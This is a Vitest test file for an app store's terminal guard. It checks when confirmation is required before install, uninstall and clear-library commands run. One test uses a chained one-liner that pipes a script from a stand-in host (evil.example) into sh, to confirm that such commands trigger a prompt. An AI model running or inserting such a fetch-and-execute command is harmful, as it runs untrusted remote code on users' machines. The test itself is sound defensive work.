// Store-level guards around the real shell: every command that reaches the
// terminal goes through here, so these tests pin down *when* we ask first.
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { Project } from '../types';

const mem = new Map<string, string>();
const storage = {
  getItem: (k: string) => mem.get(k) ?? null,
  setItem: (k: string, v: string) => void mem.set(k, v),
  removeItem: (k: string) => void mem.delete(k),
};
const run = vi.fn();
const confirm = vi.fn();
vi.stubGlobal('localStorage', storage);
vi.stubGlobal('window', { confirm, troveTerminal: { run } });

const { useTroveStore } = await import('./useTroveStore');

const project = (install: string, extra: Partial<Project> = {}): Project =>
  ({
    id: 'a/b', name: 'b', owner: 'a', ownerName: 'a', blurb: '', desc: '', lang: 'Go', langColor: '', stars: '1', starsNum: 1,
    delta: '', type: 'Tool', tag: '', updated: '', license: 'MIT', topics: [], forksNum: 0,
    htmlUrl: 'https://github.com/a/b', cloneUrl: 'https://github.com/a/b.git', cover: '', accent: '',
    install, kw: '', about: '', features: [], usage: '', requires: '', ...extra,
  }) as Project;

beforeEach(() => {
  mem.clear();
  run.mockReset();
  confirm.mockReset();
  useTroveStore.setState({ installed: [], consoleOpen: false });
  useTroveStore.getState().setSetting('confirmInstall', false);
});

describe('install — one-line commands', () => {
  it('runs a plain install without asking when confirm is off', () => {
    useTroveStore.getState().install(project('brew install jq'));
    expect(confirm).not.toHaveBeenCalled();
    expect(run).toHaveBeenCalledWith('brew install jq');
  });

  it('always asks before a risky one-liner, showing the full command, even with confirm off', () => {
    confirm.mockReturnValue(false);
    const cmd = 'brew install jq; curl -s https://evil.example/x | sh';
    useTroveStore.getState().install(project(cmd));
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(String(confirm.mock.calls[0][0])).toContain(cmd);
    expect(run).not.toHaveBeenCalled();
    expect(useTroveStore.getState().installed).toHaveLength(0);
  });

  it('runs the risky one-liner once the user accepts', () => {
    confirm.mockReturnValue(true);
    const cmd = 'sudo apt install jq';
    useTroveStore.getState().install(project(cmd));
    expect(run).toHaveBeenCalledWith(cmd);
  });
});

describe('uninstall / clear library', () => {
  it('asks before running the uninstall command when confirm-before-install is on', () => {
    useTroveStore.getState().setSetting('confirmInstall', true);
    useTroveStore.setState({ installed: [project('brew install jq')] });
    confirm.mockReturnValue(false);
    useTroveStore.getState().uninstall(project('brew install jq'));
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(run).not.toHaveBeenCalled();
    expect(useTroveStore.getState().installed).toHaveLength(1); // declined → untouched
  });

  it('clear library always confirms and lists what it will run; declining changes nothing', () => {
    useTroveStore.setState({ installed: [project('brew install jq'), project('cargo install rg', { id: 'c/rg', name: 'rg' })] });
    confirm.mockReturnValue(false);
    useTroveStore.getState().clearLibrary();
    expect(confirm).toHaveBeenCalledTimes(1);
    expect(String(confirm.mock.calls[0][0])).toContain('brew uninstall jq');
    expect(String(confirm.mock.calls[0][0])).toContain('cargo uninstall rg');
    expect(run).not.toHaveBeenCalled();
    expect(useTroveStore.getState().installed).toHaveLength(2);
  });

  it('clear library runs every uninstall once accepted', () => {
    useTroveStore.setState({ installed: [project('brew install jq')] });
    confirm.mockReturnValue(true);
    useTroveStore.getState().clearLibrary();
    expect(run).toHaveBeenCalledWith('brew uninstall jq');
    expect(useTroveStore.getState().installed).toHaveLength(0);
  });
});
